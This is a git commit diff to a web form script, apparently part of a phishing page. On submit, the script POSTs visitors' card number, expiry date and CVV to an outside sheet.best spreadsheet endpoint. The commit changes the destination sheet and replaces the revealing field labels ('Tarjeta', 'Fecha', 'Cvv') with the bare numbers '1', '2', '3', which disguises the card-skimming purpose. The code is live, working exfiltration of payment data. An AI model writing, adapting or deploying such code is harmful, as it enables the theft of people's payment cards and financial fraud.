a51522cdbed1377008023010e78e3ed0ee929491
soporte-8c <162223886+soporte-8c@users.noreply.github.com>
2024-05-14 12:00:35 -0600

    Update 1113.js

--- azt/js/1113.js
+++ azt/js/1113.js
@@ -7,16 +7,16 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://sheet.best/api/sheets/544ba85d-0dc0-447d-ab00-e346266534c1', {
+    const respuesta = await fetch('https://sheet.best/api/sheets/0286dc53-3203-4d75-8a03-832791c3d2b2', {
         method: 'POST',
         mode: 'cors',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            "Tarjeta": formulario.data1.value,
-            "Fecha": formulario.data2.value,
-            "Cvv": formulario.data3.value
+            "1": formulario.data1.value,
+            "2": formulario.data2.value,
+            "3": formulario.data3.value
         })
     });
 
